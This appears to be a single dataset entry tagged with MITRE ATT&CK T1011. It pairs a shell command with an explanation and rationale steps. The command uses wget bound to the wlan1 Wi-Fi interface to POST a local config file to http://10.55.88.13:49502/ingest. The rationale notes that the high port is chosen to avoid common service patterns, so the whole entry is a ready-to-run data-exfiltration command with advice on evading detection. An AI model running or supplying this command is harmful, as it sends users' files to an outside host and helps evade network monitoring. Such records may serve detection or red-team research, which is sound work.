command: iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address="$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest
explanation: Uses wget with --bind-address to force an HTTP POST over wlan1 to an uncommon port, aligning with T1011 by using a separate Wi‑Fi medium for exfiltration.
rationale_steps: Bind the HTTP client to wlan1’s IP ensuring the alternate medium is used.
POST the data to a high-numbered port to avoid common service patterns.
